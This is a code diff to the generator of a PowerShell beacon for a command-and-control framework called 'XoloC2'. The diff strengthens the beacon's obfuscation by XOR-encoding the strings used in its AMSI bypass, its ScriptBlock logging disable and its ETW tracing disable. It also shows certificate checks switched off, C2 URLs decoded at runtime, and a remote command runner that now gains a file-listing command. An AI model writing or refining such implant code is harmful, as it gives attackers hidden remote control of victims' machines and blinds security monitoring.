@@ -5782,37 +5782,38 @@ $_REF=@("https://www.google.com/","https://www.bing.com/search?q=windows+update"
     : '';
 
   return `# XoloC2 PowerShell beacon
+# ── Decoder + Key (needed for bypass strings) ─────────────────────────────────
+function _D{param($h,$k)$b=New-Object byte[] ($h.Length/2);for($i=0;$i-lt$h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)};$ke=[Text.Encoding]::UTF8.GetBytes($k);$o=New-Object byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){$o[$i]=$b[$i]-bxor$ke[$i%$ke.Length]};[Text.Encoding]::UTF8.GetString($o)}
+$_k="${xk}"
 # ── Layer 1: AMSI bypass ───────────────────────────────────────────────────────
 try{
-  $_aa=[Ref].Assembly.GetType(('System.Man'+'agement.Au'+'tomation.A'+'msiUtils'))
-  $_ab=$_aa.GetField(('amsiI'+'nitFai'+'led'),'NonPublic,Static')
+  $_aa=[Ref].Assembly.GetType((_D "${enc('System.Management.Automation.AmsiUtils')}" $_k))
+  $_ab=$_aa.GetField((_D "${enc('amsiInitFailed')}" $_k),(_D "${enc('NonPublic,Static')}" $_k))
   $_ab.SetValue($null,$true)
 }catch{}
 # ── Layer 2: ScriptBlock logging disable ───────────────────────────────────────
 try{
-  $_la=[Ref].Assembly.GetType(('System.Man'+'agement.Au'+'tomation.U'+'tils'))
-  $_lb=$_la.GetField(('cachedGrou'+'pPolicySet'+'tings'),'NonPublic,Static')
+  $_la=[Ref].Assembly.GetType((_D "${enc('System.Management.Automation.Utils')}" $_k))
+  $_lb=$_la.GetField((_D "${enc('cachedGroupPolicySettings')}" $_k),(_D "${enc('NonPublic,Static')}" $_k))
   if($_lb){
     $_lc=$_lb.GetValue($null)
-    if($_lc -and $_lc['ScriptBlockLogging']){
-      $_lc['ScriptBlockLogging']['EnableScriptBlockLogging']=0
-      $_lc['ScriptBlockLogging']['EnableScriptBlockInvocationLogging']=0
+    if($_lc -and $_lc[(_D "${enc('ScriptBlockLogging')}" $_k)]){
+      $_lc[(_D "${enc('ScriptBlockLogging')}" $_k)][(_D "${enc('EnableScriptBlockLogging')}" $_k)]=0
+      $_lc[(_D "${enc('ScriptBlockLogging')}" $_k)][(_D "${enc('EnableScriptBlockInvocationLogging')}" $_k)]=0
     }
   }
 }catch{}
 # ── Layer 3: ETW disable ───────────────────────────────────────────────────────
 try{
-  $pa=[Ref].Assembly.GetType(('System.Man'+'agement.Au'+'tomation.Tr'+'acing.PSEtwT'+'racer'))
+  $pa=[Ref].Assembly.GetType((_D "${enc('System.Management.Automation.Tracing.PSEtwTracer')}" $_k))
   if($pa){
-    $pf=$pa.GetField('etwProvider','NonPublic,Static')
-    if($pf){$pv=$pf.GetValue($null);if($pv){$pm=$pv.GetType().GetField('m_enabled','NonPublic,Instance');if($pm){$pm.SetValue($pv,[byte]0)}}}
+    $pf=$pa.GetField((_D "${enc('etwProvider')}" $_k),(_D "${enc('NonPublic,Static')}" $_k))
+    if($pf){$pv=$pf.GetValue($null);if($pv){$pm=$pv.GetType().GetField((_D "${enc('m_enabled')}" $_k),(_D "${enc('NonPublic,Instance')}" $_k));if($pm){$pm.SetValue($pv,[byte]0)}}}
   }
 }catch{}
 # ── Layer 4: SSL + TLS ─────────────────────────────────────────────────────────
 [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]'Tls12,Tls'
-# ── Decoder ────────────────────────────────────────────────────────────────────
-function _D{param($h,$k)$b=New-Object byte[] ($h.Length/2);for($i=0;$i-lt$h.Length;$i+=2){$b[$i/2]=[Convert]::ToByte($h.Substring($i,2),16)};$ke=[Text.Encoding]::UTF8.GetBytes($k);$o=New-Object byte[] $b.Length;for($i=0;$i-lt$b.Length;$i++){$o[$i]=$b[$i]-bxor$ke[$i%$ke.Length]};[Text.Encoding]::UTF8.GetString($o)}
 # ── Config ─────────────────────────────────────────────────────────────────────
 $_k="${xk}"
 $C2=@(${eUrls})|%{_D $_ $_k}
@@ -5900,11 +5901,24 @@ function _Run{param($cmd,$tid)
     if(Test-Path $p -PathType Container){$script:_cwd=$p;_SaveCwd $p;return ""}
     return "El sistema no puede encontrar la ruta especificada."
   }
+  if($cmd -match '^__pty__:'){return '[PTY not supported on PowerShell beacon]'}
+  if($cmd -match '^__ls__:(.*)$'){
+    $lp=$Matches[1].Trim()
+    if(!$lp){$lp=$script:_cwd}
+    if(![IO.Path]::IsPathRooted($lp)){$lp=Join-Path $script:_cwd $lp}
+    $lp=[IO.Path]::GetFullPath($lp)
+    try{
+      $ents=@(Get-ChildItem -LiteralPath $lp -Force -EA Stop|Sort-Object @{E={!$_.PSIsContainer}},Name|%{
+        [ordered]@{name=$_.Name;type=$(if($_.PSIsContainer){'dir'}else{'file'});size=$(if($_.PSIsContainer){0}else{$_.Length});modified=[int][DateTimeOffset]::new($_.LastWriteTimeUtc).ToUnixTimeSeconds()}
+      })
+      return ConvertTo-Json ([ordered]@{path=$lp;entries=$ents}) -Compress -Depth 3
+    }catch{return "Error: $_"}
+  }
   if($cmd -match '^shell (.+)$'){$cmd=$Matches[1]}
   try{
     $cwd_esc=$script:_cwd -replace "'","''"
     $sb=[ScriptBlock]::Create("Set-Location '$cwd_esc'; $cmd; Write-Output ('__CWD__:'+(Get-Location).Path)")
-    $out=&$sb 2>&1|Out-String
+    $out=&$sb|Out-String
     $lines=$out.Replace("\`r","").Trim().Split("\`n")
     $cwdl=$lines|?{$_ -match '^__CWD__:'}|select -Last 1
     if($cwdl){$nc=$cwdl.Substring(8).Trim();if(Test-Path $nc -PathType Container -EA 0){$script:_cwd=$nc;_SaveCwd $nc}}
